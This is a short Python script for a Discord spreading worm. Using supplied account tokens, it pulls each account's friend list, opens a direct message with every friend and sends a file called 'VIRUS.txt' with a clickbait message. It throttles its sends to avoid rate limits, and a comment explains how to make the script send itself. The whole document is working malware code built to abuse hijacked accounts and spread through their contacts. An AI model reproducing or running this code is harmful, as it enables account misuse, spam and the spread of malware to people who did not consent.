from threading import Thread
from sys import argv
from time import sleep
from json import loads, dumps
from requests import get, post

def main():
    message = 'Check this out 😮'
    file_name = 'VIRUS'
    file_ext = "txt"
    self_spread_delay = 750 / 100 # delay so no ratelimit, i recommend 750 / 100

    tokens = [""] # Put tokens here, several tokens are supported. For example: ["token"] or ["token", "token"]

    with open("./hey.txt", encoding='utf-8') as f: # change argv[0] to file path, otherwise file sends itself
        content = f.read() # get file contents
    payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{file_name}.{file_ext}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\n{message}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
    for token in tokens:
        Thread(target=spread, args=(token, payload, self_spread_delay)).start()

def get_headers(token=None, content_type='application/json'):
    headers = {
        'Content-Type': content_type,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Authorization': token
    }
    return headers

def get_friends(token):
    response = get('https://discordapp.com/api/v6/users/@me/relationships', headers=get_headers(token))
    if response.status_code == 200: 
        return loads(response.content.decode())
    else: 
        pass

def get_chat(token, uid):
    try: 
        return post('https://discordapp.com/api/v6/users/@me/channels', headers=get_headers(token), data=dumps({'recipient_id': uid}).encode()).json()['id']
    except: 
        pass

def spread(token, form_data, delay):
    for friend in get_friends(token):
        try:
            headers = get_headers(token, 'multipart/form-data; boundary=---------------------------325414537030329320151394843687')
            post(f"https://discordapp.com/api/v6/channels/{get_chat(token, friend['id'])}/messages", headers=headers, data=form_data.encode()).raise_for_status()
        except: 
              pass
            
        print(f"Sent file to friend: {friend['user']['username']}")
        sleep(delay)

main()
